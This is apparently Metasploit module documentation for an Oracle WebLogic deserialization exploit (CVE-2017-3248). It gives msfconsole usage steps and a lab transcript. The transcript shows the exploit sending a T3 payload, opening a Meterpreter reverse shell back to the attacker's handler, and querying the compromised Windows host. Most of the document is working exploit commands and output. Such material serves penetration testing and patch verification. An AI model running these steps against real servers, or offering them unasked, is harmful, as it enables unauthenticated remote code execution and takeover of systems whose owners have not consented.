## Description
 Oracle Weblogic Server v10.3.6.0, v12.1.3.0, and v12.2.1.1 are vulnerable to a deserialization vulnerability (CVE 2017-3248) in the core Components subcomponent due to unsafe deserialization of Java objects by the RMI registry and produce a JRMP connection from the target, which can be used to execute code on vulnerable systems. An unauthenticated user with network access via T3 could exploit the vulnerability. This module has been tested against Oracle Weblogic Server v10.3.6.0 and v12.1.3.0 running on Windows 7 x64 using JDK v7u80.

## Vulnerable Application
 Oracle Weblogic Server v10.3.6.0, v12.1.3.0, and v12.2.1.1.

## Verification Steps
 1. `./msfconsole -q`
 2. `use exploit/multi/misc/weblogic_deserialize_unicastref`
 3. `set srvhost <srvhost>`
 4. `set srvport <srvport>`
 5. `set rhosts <rhost>`
 6. `set rport <srvport>`
 7. `exploit`
 8. `sessions -i 1`

## Scenarios
### Tested on Windows 7 x64 running Oracle Weblogic Server 10.3.6.0 and 12.1.3.0 on JDK v7u80
 ```
 msf exploit(multi/misc/weblogic_deserialize_unicastref) > set srvhost 192.168.192.136
 srvhost => 192.168.192.136
 msf exploit(multi/misc/weblogic_deserialize_unicastref) > set srvport 8888
 srvport => 8888
 msf exploit(multi/misc/weblogic_deserialize_unicastref) > set rhost 192.168.192.6
 rhost => 192.168.192.6
 msf exploit(multi/misc/weblogic_deserialize_unicastref) > set rport 7001
 rport => 7001
 msf exploit(multi/misc/weblogic_deserialize_unicastref) > exploit
 [*] Exploit running as background job 17.

 [*] Started reverse TCP handler on 192.168.192.136:4444 
 msf exploit(multi/misc/weblogic_deserialize_unicastref) > [*] 192.168.192.6:7001 - Sending handshake...
 [*] 192.168.192.6:7001 - Sending T3 request object...
 [*] 192.168.192.6:7001 - Sending client object payload...
 [*] 192.168.192.6:7001 - Sending payload to client: 192.168.192.6
 [*] Sending stage (179779 bytes) to 192.168.192.6
 [*] Meterpreter session 9 opened (192.168.192.136:4444 -> 192.168.192.6:49283) at 2018-12-14 11:45:44 -0800
 [*] 192.168.192.6:7001 - Server stopped.
 msf exploit(multi/misc/weblogic_deserialize_unicastref) > sessions -i 9
 [*] Starting interaction with 9...

 meterpreter > sysinfo
 Computer        : GIOTTO-HS-W7
 OS              : Windows 7 (Build 7600).
 Architecture    : x64
 System Language : en_US
 Domain          : WORKGROUP
 Logged On Users : 2
 Meterpreter     : x86/windows

 ```
